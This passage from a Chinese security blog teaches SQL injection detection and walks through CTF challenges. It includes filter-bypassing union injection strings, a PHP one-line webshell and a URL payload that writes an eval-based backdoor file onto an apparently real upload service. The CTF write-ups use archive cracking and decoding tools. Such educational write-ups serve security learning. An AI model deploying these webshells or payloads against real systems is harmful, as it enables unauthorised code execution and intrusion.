<p>如果页面返回错误，则存在SQL注入，原因是无论字符型还是整型都会引号个数不匹配而报错。就算没有报错当然也不能说明不存在SQL注入漏洞，有可能只是对单引号做了过滤。</p>
<blockquote>
<p>判断SQL注入类型</p>
</blockquote>
<p>其实所有的类型都是根据数据库本身表的类型所产生的，在我们创建表的时候会发现其后总有个数据类型的限制，而不同的数据库又有不同的数据类型，但是无论怎么分<strong>常用</strong>的查询数据类型总是以数字与字符来区分的，所以就会产生注入点为何种类型。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-24%20%E4%B8%8B%E5%8D%8811.01.27.png" alt="屏幕快照 2017-09-24 下午11.01.27.png" title="" class="">
                <p>屏幕快照 2017-09-24 下午11.01.27.png</p>
            </figure>
<ul>
<li>字符型</li>
</ul>
<p>当输入的参数为字符型的时候，通常abc.php中的SQL语句类型大致如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from &lt;表名&gt; where id = &apos;x&apos;</div></pre></td></tr></table></figure>
<p>这种类型我们同样可以使用<code>and &#39;1&#39;=&#39;1</code>和<code>and &#39;1&#39;=&#39;2</code>来判断：</p>
<ol>
<li>Url 地址中输入 <code>http://xxx/abc.php?id= x&#39; and &#39;1&#39;=&#39;1</code> 页面运行正常，继续进行下一步。</li>
<li>Url 地址中继续输入 <code>http://xxx/abc.php?id= x&#39; and &#39;1&#39;=&#39;2</code> 页面运行错误，则说明此 Sql 注入为字符型注入。</li>
</ol>
<p>当输入<code>and &#39;1&#39;=&#39;1</code>时，后台执行SQL语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from &lt;表名&gt; where id = &apos;x&apos; and &apos;1&apos;=&apos;1&apos;</div></pre></td></tr></table></figure>
<p>当输入 <code>and &#39;1&#39;=&#39;2</code>时，后台执行 Sql 语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from &lt;表名&gt; where id = &apos;x&apos; and &apos;1&apos;=&apos;2&apos;</div></pre></td></tr></table></figure>
<p>语法正确，但逻辑判断错误，所以返回正确。我们同样可以使用假设法来验证。</p>
<ul>
<li>数字型</li>
</ul>
<p>当输入参数为整型的时候，通常SQL语句类型大致如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from &lt;表名&gt; where id=x</div></pre></td></tr></table></figure>
<p>这种类型就可以直接使用经典的<code>and 1=1</code>和<code>and 1=2</code>来判断了：</p>
<ol>
<li>Url 地址中输入 <code>http://xxx/abc.php?id= x and 1=1</code> 页面依旧运行正常，继续进行下一步。</li>
<li>Url 地址中继续输入 <code>http://xxx/abc.php?id= x and 1=2</code> 页面运行错误，则说明此 Sql 注入为数字型注入。</li>
</ol>
<p>至于后台执行的SQL语句可以直接参考字符型的。</p>
<h2 id="SQL注入实战"><a href="#SQL注入实战" class="headerlink" title="SQL注入实战"></a>SQL注入实战</h2><h3 id="实战一"><a href="#实战一" class="headerlink" title="实战一"></a>实战一</h3><p>刚刚点进去的时候如右图所示：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-25%20%E4%B8%8A%E5%8D%8812.23.25.png" alt="屏幕快照 2017-09-25 上午12.23.25.png" title="" class="">
                <p>屏幕快照 2017-09-25 上午12.23.25.png</p>
            </figure></p>
<p> 1.为了知道到底传递了什么参数，我们输入了1并提交，然后发现了<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-25%20%E4%B8%8A%E5%8D%8812.24.49.png" alt="屏幕快照 2017-09-25 上午12.24.49.png" title="" class="">
                <p>屏幕快照 2017-09-25 上午12.24.49.png</p>
            </figure></p>
<p> 2.而在输入1’的时候报错，所以判断存在注入点，因为需要获得flag值，初步预估后台存储flag的表应该为flag,所以需要构造一条语句来查询</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select flag from flag</div></pre></td></tr></table></figure>
<p> 3.根据第二步的报错信息看，多加个‘，后面的语句需要再构造一个条件来结束’，注入语句为：1’  union select flag from flag where ‘t’=’t</p>
<p>执行后报错：heck the manual that corresponds to your MySQL server version for the right syntax to use near ‘flag flag ‘t’=’t’’ at line 1</p>
<p>分析：根据错误信息发现只有变量了，其他的关键字都被过滤了。</p>
<p> 4.把关键字写2遍提交，发现如下报错： corresponds to your MySQL server version for the right syntax to use near ‘unionselectflag fromflag where’t’=’t’’ at line 1</p>
<p>  分析：发现空格被过滤了</p>
<p> 5.使用+号在空格之前连接(在url中进行拼接)：</p>
<p>1’+unionunion +selectselect +flag+fromfrom +flag+wherewhere+’t’=’t</p>
<p>这样的话就可以提交成功了，这种事情比较需要坚持不懈的毅力，半途而废是找不到漏洞的！</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-25%20%E4%B8%8A%E5%8D%8812.37.50.png" alt="屏幕快照 2017-09-25 上午12.37.50.png" title="" class="">
                <p>屏幕快照 2017-09-25 上午12.37.50.png</p>
            </figure>
<h4 id="实战二"><a href="#实战二" class="headerlink" title="实战二"></a>实战二</h4><p>今天为了检测一个文件上传下载的应用有没有漏洞，所以就对它进行了一下基本的注入，果然是有漏洞的hhh，虽然这个并不是SQL注入的漏洞，但是在这里也可以拿出来说一下，说到文件上传，大家首先想到的自然是文件包含漏洞，我首先构造的是一个隐蔽的php一句话木马：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$_GET[<span class="string">'a'</span>]($_GET[<span class="string">'code'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>然后尝试着上传这个文件,emmmm，并没有对上传的文件类型做限制，所以很轻松的就上传了上去，接下来就可以通过工具（或者社工）找到上传文件的路径，然后执行这个php脚本，手动的去拼接参数：</p>
<p>这里需要注意的一点就是我们对于url中的base64解码不要使用一般的那种在线工具,在上面的base64传统编码中会出现+, /两个会被url直接转义的符号，因此如果希望通过url传输这些编码字符串，我们需要先做传统base64编码，随后将+和/分别替换为- _两个字符，在接收端则做相反的动作解码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/python</span></div><div class="line"><span class="comment">#encoding=utf-8</span></div><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64_url_decode</span><span class="params">(string)</span>:</span></div><div class="line">    <span class="comment"># 通过url传输时去掉了=号，所以需要补上=号</span></div><div class="line">    <span class="keyword">return</span> base64.urlsafe_b64decode(str(string + <span class="string">'='</span> * (<span class="number">4</span> - len(string) % <span class="number">4</span>)))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64_url_encode</span><span class="params">(string)</span>:</span></div><div class="line">    <span class="keyword">return</span> base64.urlsafe_b64encode(str(string)).rstrip(<span class="string">'='</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    s=raw_input(<span class="string">'please input the type--&gt;encode/decode:\n'</span>)</div><div class="line">    <span class="keyword">if</span> s==<span class="string">'encode'</span>:</div><div class="line">        r=raw_input(<span class="string">'please input the string you want to encode:'</span>)</div><div class="line">        r=base64_url_encode(r)</div><div class="line">        print(r)</div><div class="line">    <span class="keyword">elif</span> s==<span class="string">'decode'</span>:</div><div class="line">        r=raw_input(<span class="string">'please input the string you want to decode:'</span>)</div><div class="line">        r=base64_url_decode(r)</div><div class="line">        print(r)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        print(<span class="string">'fuck you!!!\nasshole!\ndon’t you know english?'</span>)</div></pre></td></tr></table></figure>
<p>这样一来，我们就可以用这个工具在执行脚本的时候传递我们所需要的参数了，比如说创建一个hack.php的文件，在url中可以进行这样的拼接：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id?a=assert&amp;code=$&#123;fputs%28fopen%28base64_decode%28aGFjay5waHA%29,w%29,base64 _decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgIGVjaG8iPGgxPnlvdSBhcmUgaGFja2VkPC9oMT4iPz4%29%29&#125;;</div></pre></td></tr></table></figure>
<p>当你访问的时候效果就是：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-25%20%E4%B8%8B%E5%8D%885.25.52.png" alt="屏幕快照 2017-09-25 下午5.25.52.png" title="" class="">
                <p>屏幕快照 2017-09-25 下午5.25.52.png</p>
            </figure></p>
<p>当然你可以传递进去参数把它文件删除也是可以的，平时在写应用的时候还是要多考虑一下安全问题呀。</p>
]]></content>
      
        <categories>
            
            <category> SQL注入 实战演练 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF-MISC]]></title>
      <url>/2017/09/18/CTF-%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9/</url>
      <content type="html"><![CDATA[<p>赛前抱佛脚刷题的安全杂项系列，不用花松果就可以看到的write up岂不美哉</p>
<a id="more"></a>
<h1 id="安全杂项-misc"><a href="#安全杂项-misc" class="headerlink" title="安全杂项(misc)"></a>安全杂项(misc)</h1><p>网络安全是一个非常广泛的部分，除了web安全，隐写术，逆向工程这种主要的部分之外，其他的一些没有具体特性的问题被统称为安全杂项，今天就来说一下安全杂项的问题，其中包含着各种奇奇怪怪的安全实例，那么就系好安全带，要发车了～</p>
<h2 id="0X00-base64"><a href="#0X00-base64" class="headerlink" title="0X00-base64"></a>0X00-base64</h2><p>这是一道非常经典的题目了，讲述了一个动(cao)人(dan)的故事:</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-18%20%E4%B8%8B%E5%8D%887.09.36.png" alt="屏幕快照 2017-09-18 下午7.09.36.png" title="" class="">
                <p>屏幕快照 2017-09-18 下午7.09.36.png</p>
            </figure>
<p>首先当然是把文件下载下来啦～，点击获取邮件，会下载一个后缀名为.rar的压缩包，解压缩之后会有一个txt文件，打开呈现的是下面这个样子：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-18%20%E4%B8%8B%E5%8D%887.11.48.png" alt="屏幕快照 2017-09-18 下午7.11.48.png" title="" class="">
                <p>屏幕快照 2017-09-18 下午7.11.48.png</p>
            </figure>
<p>发现邮件的正文部分已经被加密了，凭借我们的经验可以看出这个是base64编码的，将正文部分复制出来解码得到了一串html的代码，将html代码保存在记事本中，并保存为html格式。</p>
<p>在浏览器中打开后，发现是乱码，这个时候调整一下浏览器的编码问题，于是得到了最终的flag值，帅帅同学成功阅读了来自女朋友的邮件（快把这种女盆友打死吧！）</p>
<h2 id="0X01-misc50"><a href="#0X01-misc50" class="headerlink" title="0X01-misc50"></a>0X01-misc50</h2><p>这个题需要我们从日志中分析出我们所需要的flag值到底是多少，这道题的难度就已经上升了许多，下载了文件之后打开发现是首部为rar的乱码，判断为一个压缩包，修改后缀名之后解压缩得到一个log文件：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-18%20%E4%B8%8B%E5%8D%887.27.08.png" alt="屏幕快照 2017-09-18 下午7.27.08.png" title="" class="">
                <p>屏幕快照 2017-09-18 下午7.27.08.png</p>
            </figure>
<p>往下查看的时候发现了有sqlmap的payload，将文本用sublime打开之后想要搜索一下会不会有我们想要的flag，结果发现了有一些行中包含了这个关键字：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-18%20%E4%B8%8B%E5%8D%887.31.01.png" alt="屏幕快照 2017-09-18 下午7.31.01.png" title="" class="">
                <p>屏幕快照 2017-09-18 下午7.31.01.png</p>
            </figure>
<p>这个时候为了将这些数据筛选出来可以使用linux命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat log | grep &quot;misc.flag&quot; &gt; log1</div></pre></td></tr></table></figure>
<p>这样一来我们就缩小了目标，同时要对log1进行解码，关于url的编码和解码部分，可以参考阮一峰的博客<a href="http://www.ruanyifeng.com/blog/2010/02/url_encoding.html" target="_blank" rel="external">关于URL编码</a>，这里的url是用的js的escape编码，所以我们使用unescape之后得到文件log2，这时候文件2已经小上了许多，但是我们仍然无法从中发现我们想要的flag值：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-18%20%E4%B8%8B%E5%8D%887.55.46.png" alt="屏幕快照 2017-09-18 下午7.55.46.png" title="" class="">
                <p>屏幕快照 2017-09-18 下午7.55.46.png</p>
            </figure>
<p>从这些payload中我们可以看出来这是一些盲注的尝试，对每一个字符进行一个ASCII码的比对，我们需要的就是找出这些不等于的部分，同样可以使用linux命令；</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat log2 | grep &quot;!=&quot; &gt; log3</div></pre></td></tr></table></figure>
<p>这个时候的log3已经非常的小了，剩下我们所需要的工作就是将这些ASCII码还原出来，可以使用一个python的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">f = open(<span class="string">'log3'</span>)</div><div class="line">s = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</div><div class="line">  start = i.index(<span class="string">'))!='</span>)</div><div class="line">  end = i.index(<span class="string">'),'</span>, start)</div><div class="line">  s += (chr(int(i[start+<span class="number">4</span>:end])))</div><div class="line"><span class="keyword">print</span> s</div></pre></td></tr></table></figure>
<p>输出之后的结果是：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-18%20%E4%B8%8B%E5%8D%888.06.16.png" alt="屏幕快照 2017-09-18 下午8.06.16.png" title="" class="">
                <p>屏幕快照 2017-09-18 下午8.06.16.png</p>
            </figure></p>
<p>花括号内就是我们的flag值了，呼～真是心累，虽然过程没写多少，但是还是一道比较综合的题目</p>
<h2 id="0X02-破损的磁带"><a href="#0X02-破损的磁带" class="headerlink" title="0X02-破损的磁带"></a>0X02-破损的磁带</h2><p>照例是点击链接，然后跳转到一个网站：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-18%20%E4%B8%8B%E5%8D%888.18.56.png" alt="屏幕快照 2017-09-18 下午8.18.56.png" title="" class="">
                <p>屏幕快照 2017-09-18 下午8.18.56.png</p>
            </figure>
<p>我们可以发现一共八行，应该是对应了八个字符，第三行和第五行是一样的，代表的都是字符<code>i</code>,那么这个破损的磁带必定是通过一种编码的方式，根据o和_首先统计出一共有7个标识位</p>
<p>那么我们不禁想到会不会代表的是二进制呢，敢想就敢做，将o位当成1，_位视作0，发现B对应的二进制数是1000010，转换为十进制就是66，这恰好就是B所对应的ASCII表中的数字，于是继续验证下去，发现果然是使用的ASCII编码，那么就可以开始来解题了：</p>
<p>因为key的格式为simCTF{}，这个时候我们需要来进行替换，但是可以vim，先将字符导入文件吧：</p>
<p>使用vim的命令进行替换之后的效果如图：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-18%20%E4%B8%8B%E5%8D%888.28.58.png" alt="屏幕快照 2017-09-18 下午8.28.58.png" title="" class="">
                <p>屏幕快照 2017-09-18 下午8.28.58.png</p>
            </figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#将o转换为1</div><div class="line">:%s/o/1/g</div><div class="line">#将_转换为0</div><div class="line">:%s/_/0/g</div></pre></td></tr></table></figure>
<p>然后用python脚本将这些二进制数转为十进制，再转换成ASCII的模式，最终得到flag;</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">f = open(<span class="string">'brokenDisk'</span>)</div><div class="line">s=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</div><div class="line">  i = int(i, <span class="number">10</span>)</div><div class="line">  s += chr(i)</div><div class="line"><span class="keyword">print</span> s</div></pre></td></tr></table></figure>
<p>我们的flag值已经拿到了！！！—&gt;Where there is a will,there is a way.</p>
<h2 id="0X03-功夫秘籍"><a href="#0X03-功夫秘籍" class="headerlink" title="0X03-功夫秘籍"></a>0X03-功夫秘籍</h2><p>这一次我们在点击网页之后下载了一个名为kungfu.rar的压缩包，点击一下，果断打不开，正常情况，于是猜想是其他的格式，试了一下图片类，然后成功了。还以为是其中JSB算法，很开心的使用stegsolve扫了扫，发现并不是。</p>
<p>没办法，使用binwalk一扫，我擦，原来是png格式的，其中还包着一个zlib压缩包，使用命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">binwalk -e kungfu.png</div></pre></td></tr></table></figure>
<p>出来一个目录，其中有一个4D.zlib的压缩包，反正是打不开的，再也不会上当了！！！</p>
<p>查看后取出key值：</p>
<p>果断使用base64解码得到一串字符串：T_ysK9_5rhk__uFMt}3El{nu@E </p>
<p>看样子应该是个栅栏密码，使用栅栏密码破解工具（python编写）进行破解获得flag</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-18%20%E4%B8%8B%E5%8D%889.55.39.png" alt="屏幕快照 2017-09-18 下午9.55.39.png" title="" class="">
                <p>屏幕快照 2017-09-18 下午9.55.39.png</p>
            </figure>
<p>提交括号内的值成功，大功告成！</p>
<p>这里提供一个暴力破解栅栏密码的python脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python3</span></div><div class="line">e = raw_input(<span class="string">'please input the string\n'</span>)</div><div class="line">elen = len(e)</div><div class="line">field=[]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,elen):</div><div class="line">    <span class="keyword">if</span>(elen%i == <span class="number">0</span>):</div><div class="line">        field.append(i)</div><div class="line"></div><div class="line"><span class="keyword">for</span> f <span class="keyword">in</span> field:</div><div class="line">    b = elen / f</div><div class="line">    result = &#123;x:<span class="string">''</span> <span class="keyword">for</span> x <span class="keyword">in</span> range(b)&#125;</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(elen):</div><div class="line">        a = i % b;</div><div class="line">        result.update(&#123;a:result[a] + e[i]&#125;)</div><div class="line">    d = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(b):</div><div class="line">        d = d + result[i]</div><div class="line">    <span class="keyword">print</span> (<span class="string">'num:\t'</span>+str(f)+<span class="string">'\t'</span>+<span class="string">'result:\t'</span>+d)</div><div class="line">raw_input()</div></pre></td></tr></table></figure>
<h2 id="0X04-图片里的动漫"><a href="#0X04-图片里的动漫" class="headerlink" title="0X04-图片里的动漫"></a>0X04-图片里的动漫</h2><p>经历前面的题目之后，我们对于CTF中坑爹的尿性有了一定的了解，这次我们又拿到了一张图片，表面上看起来是一副非常优美的风景呀（谁关心这种问题呀，魂淡！！！）</p>
<p>当然标准的步骤自然是先用我们的神器binwalk扫一扫，果然不出所料，出来了一个压缩包，虽然知道事情并没有那么的简单，但是还是手贱的点了一下，好了，加密的rar压缩包，打不开，暴力破解后无果。</p>
<p>那么试着用文本格式打开看一下，从头部看出果然是个A货，这玩意其实是个jpg图片呀！转换之后发现是一张倒置的七龙珠图片：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-19%20%E4%B8%8A%E5%8D%8811.48.01.png" alt="屏幕快照 2017-09-19 上午11.48.01.png" title="" class="">
                <p>屏幕快照 2017-09-19 上午11.48.01.png</p>
            </figure>
<p>满心欢喜提交了CTF{qlz}，嗯，不对。那么因为图片是反着的，那么就提交CTF{zlq}把，还是不对。</p>
<p>好吧，和图片相关的隐写用binwalk总是不亏的，一扫发现真的还有一个压缩包，大兄弟你是俄罗斯套娃么？？？提取出来之后又是一个加密的压缩包，这个时候可以使用我们的工具rarcrack，因为kali linux中这个工具不是自带的，所以先安装一下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install rarcrack</div></pre></td></tr></table></figure>
<p>那么就开始暴力破解吧，首先要创建一个和压缩包同名的xml文件，然后开始怼：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">touch 1.rar.xml</div><div class="line">#开多线程破解</div><div class="line">rarcrack --threads 28 --type rar 1.rar</div></pre></td></tr></table></figure>
<p>我也没有等到成功，而是又去搜了一下（怨念太深，为什么不是七龙珠，明明说了是一个动漫的小写字母啊），然后在百度百科上发现还有一种说法叫做dragonball！</p>
<p>于是乎就使用CTF{逆置的dragonball}成功夺旗，这个题就分享到这吧。</p>
<h2 id="0X05-藏在图片里的秘密"><a href="#0X05-藏在图片里的秘密" class="headerlink" title="0X05-藏在图片里的秘密"></a>0X05-藏在图片里的秘密</h2><p>这么多图片题你干脆叫隐写术好了，干嘛叫misc。到这里也算是有点套路了，下载图片，打开后，图片上面写着16 06 68 88。先记下来，说不定后面有个加密的压缩包等着我。</p>
<p>然后也是使用binwalk扫一下，但是只发现了zip压缩文件的尾，没有发现头，使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">binwalk -e 1.jpg</div></pre></td></tr></table></figure>
<p>也是无法分离的，难道是要让我补全头部之类的操作，用sublime打开之后搜索504B0304发现其实是存在的，好吧binwalk还需要提高，那我们既然找到了就自己抠出来保存为out.zip吧，但是这种方式感觉过于麻烦，在kali linux下我们可以直接使用foremost:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">foremost 1.jpg</div></pre></td></tr></table></figure>
<p>果然是个加密压缩吧，难道密码为16 06 68 88？肯定不是，这么简单做个毛啊！将图片反转之后发现原来是88 89 90 91，对应的ASCII码是”XYZ[“这4个字符，嘿嘿，还是被我发现了，输入之后仍然不对，好吧，直接上工具怼：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#先将对应的xml的初始密码设置为XYZ[吧，也许会有用</div><div class="line">rarcrack --threads 28 --type zip 1.zip</div></pre></td></tr></table></figure>
<p>一怼就怼出来了，原来是’XZY[‘，得到数字42433331，难道他就是让我们再使用一趟工具么？反正得到了答案就算了吧，不计较了。</p>
<p>你以为这样就结束了吗？？？愚蠢的人类，不管是直接输入还是ASCII码都不是flag值，蛤蛤蛤，到这里是不是就想放弃了，在一直寻找未果之后还是要回到源头，那个包含压缩包的图片，在十六进制编辑器中惊奇的发现其中有一串类似摩斯电码的玩意：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-19%20%E4%B8%8B%E5%8D%8812.56.12.png" alt="屏幕快照 2017-09-19 下午12.56.12.png" title="" class="">
                <p>屏幕快照 2017-09-19 下午12.56.12.png</p>
            </figure></p>
<p>不得不说作者是真的恶心，在使用winhex或者Mac上的hex friend的时候都会出现如下情况：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-19%20%E4%B8%8B%E5%8D%8812.58.01.png" alt="屏幕快照 2017-09-19 下午12.58.01.png" title="" class="">
                <p>屏幕快照 2017-09-19 下午12.58.01.png</p>
            </figure>这个时候就更难发现其中的秘密了。<br><br>接下来应该怎么解读呢？这个时候已经比较简单了，用到我们刚才的数字42433331，不正是对摩斯电码进行分隔么？按照分隔得到了摩斯电码：…./.-/.-../—/.–/—/-../.<br><br>使用工具转换后得到字母HALOWODE，使用格式CTF{HALOWODE}提交，终于成功。<br><br>ps:摩斯电码的脑洞是参考了别人的Writeup,太坑了<br><br><br><br>## 0X05-理查德<br><br>其实真的不想吐槽这个名字了…这到底是什么鬼名字，这么随便真的好么？？？<br><br>算了，首先下载文件，扩展名为flac，搜索一下发现是音频文件，然后用音频分析文件打开：<br><br><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-19%20%E4%B8%8B%E5%8D%8810.45.52.png" alt="屏幕快照 2017-09-19 下午10.45.52.png" title="" class="">
                <p>屏幕快照 2017-09-19 下午10.45.52.png</p>
            </figure>
<p>显然是摩斯密码，按照表解密之后得到flag值</p>
<h2 id="0X06-WTF？"><a href="#0X06-WTF？" class="headerlink" title="0X06-WTF？"></a>0X06-WTF？</h2><p>打开之后，发现是全屏的字符，直接下滑到底，出现了两个等号，一看是base64编码，解码之后全屏的0、1，看的头都要大了，并没有什么头绪，苦死未果之后去看了一下write up，居然是二维码…可以使用python的PIL库，或者使用其他的二维码生成工具，来生成二维码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#注意txt文件中是要有256行和256列，避免列表越界</span></div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"></div><div class="line">im=Image.new(<span class="string">'RGB'</span>,(<span class="number">256</span>,<span class="number">256</span>))</div><div class="line">pix = im.load()</div><div class="line"><span class="keyword">with</span> open(<span class="string">'code.txt'</span>) <span class="keyword">as</span> f:</div><div class="line">    txt=f.read()</div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> xrange(len(txt)):</div><div class="line">        <span class="keyword">if</span> txt[x] == <span class="string">'1'</span>:</div><div class="line">            pix[x/<span class="number">256</span>,x%<span class="number">256</span>]=(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            pix[x/<span class="number">256</span>,x%<span class="number">256</span>]=(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>)</div><div class="line">im.show()</div><div class="line">im.save(<span class="string">'1.png'</span>)</div></pre></td></tr></table></figure>
<p>最后得到二维码：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-20%20%E4%B8%8A%E5%8D%8812.31.21.png" alt="屏幕快照 2017-09-20 上午12.31.21.png" title="" class="">
                <p>屏幕快照 2017-09-20 上午12.31.21.png</p>
            </figure> </p>
<h2 id="0X07-A记录"><a href="#0X07-A记录" class="headerlink" title="0X07-A记录"></a>0X07-A记录</h2><figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-20%20%E4%B8%8B%E5%8D%884.32.55.png" alt="屏幕快照 2017-09-20 下午4.32.55.png" title="" class="">
                <p>屏幕快照 2017-09-20 下午4.32.55.png</p>
            </figure>
